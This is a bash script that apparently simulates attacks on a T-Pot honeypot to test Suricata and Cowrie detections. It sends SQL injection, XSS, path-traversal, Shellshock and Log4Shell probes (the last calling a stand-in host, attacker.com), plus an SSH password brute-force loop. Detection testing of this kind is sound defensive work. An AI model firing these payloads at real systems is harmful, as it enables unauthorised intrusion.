#!/usr/bin/env bash

# Simulate a short, high-signal attack sequence against T-Pot to drive Suricata/Cowrie detections.
# Usage:
#   chmod +x scripts/simulate_attack.sh
#   TPOT_IP=203.0.113.42 ./scripts/simulate_attack.sh
#
# Optional env vars:
#   TPOT_IP (default 203.0.113.42)
#   TPOT_HTTP_PORT (default 80)
#   TPOT_ALT_HTTP_PORT (default 64297)
#   TPOT_SSH_PORT (default 64295)
#   COWRIE_USER (default root)
#   COWRIE_PASS (default badpass)

set -eo pipefail

TARGET_IP=${TPOT_IP:-203.0.113.42}
PORT_HTTP=${TPOT_HTTP_PORT:-80}
PORT_ALT=${TPOT_ALT_HTTP_PORT:-64297}
PORT_SSH=${TPOT_SSH_PORT:-64295}
COWRIE_USER=${COWRIE_USER:-root}
COWRIE_PASS=${COWRIE_PASS:-badpass}

echo "== Mini-XDR attack simulator =="
echo "Target: ${TARGET_IP} (HTTP:${PORT_HTTP}, ALT_HTTP:${PORT_ALT}, SSH:${PORT_SSH})"
echo

curl_probe() {
  local port="$1"; shift
  local path="$1"; shift
  local desc="$1"; shift
  local headers=("$@")
  local extra=()
  if ((${#headers[@]})); then
    extra=("${headers[@]}")
  fi

  local url="http://${TARGET_IP}:${port}${path}"
  echo "[HTTP] ${desc} -> ${url}"
  curl -m 4 -s -o /dev/null -w "  -> %{http_code}\n" "${extra[@]}" "$url" || echo "  -> request failed"
}

echo "[*] Running HTTP probes..."
for port in "$PORT_HTTP" "$PORT_ALT"; do
  # SQLi / LFI / XSS / Shellshock / Log4Shell probes
  curl_probe "$port" "/login?id=' OR 1=1--"          "SQLi login bypass"
  curl_probe "$port" "/search?q=<script>alert(1)</script>" "XSS probe"
  curl_probe "$port" "/../../../../etc/passwd"        "LFI attempt"
  curl_probe "$port" "/cgi-bin/status"                "Shellshock" \
    -H "User-Agent: () { :;}; /bin/bash -c 'id'"
  curl_probe "$port" "/?q=\${jndi:ldap://attacker.com/a}" "Log4Shell-style probe" \
    -H 'User-Agent: Mozilla/5.0' -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'
  curl_probe "$port" "/wp-login.php"                  "WordPress login probe"
  curl_probe "$port" "/phpMyAdmin/index.php"          "phpMyAdmin probe"
  curl_probe "$port" "/admin"                         "Admin panel scan"
  curl_probe "$port" "/backup.sql"                    "Backup file grab"
done

echo
echo "[*] Running SQLi parameter spam on main HTTP port..."
for i in {1..5}; do
  payloads=(
    "id=admin%27%20OR%201=1--"
    "id=1%27%20UNION%20SELECT%20version()%20--"
    "user=admin%27%20AND%201=1--"
  )
  payload="${payloads[$RANDOM % ${#payloads[@]}]}"
  curl -m 4 -s -o /dev/null -w "  -> %{http_code}\n" \
    "http://${TARGET_IP}:${PORT_HTTP}/product?${payload}" || echo "  -> request failed"
done

echo
echo "[*] Generating SSH brute-force noise (Cowrie)..."
if command -v sshpass >/dev/null 2>&1; then
  for i in {1..6}; do
    sshpass -p "$COWRIE_PASS" ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o NumberOfPasswordPrompts=1 \
      -o ConnectTimeout=4 \
      -p "$PORT_SSH" \
      "${COWRIE_USER}@${TARGET_IP}" "exit" >/dev/null 2>&1 || true
  done
else
  echo "sshpass not found; skipping password-based SSH brute. Install sshpass to exercise Cowrie login failures."
fi

echo
echo "[*] Done. Check backend logs and /api/incidents for detections."
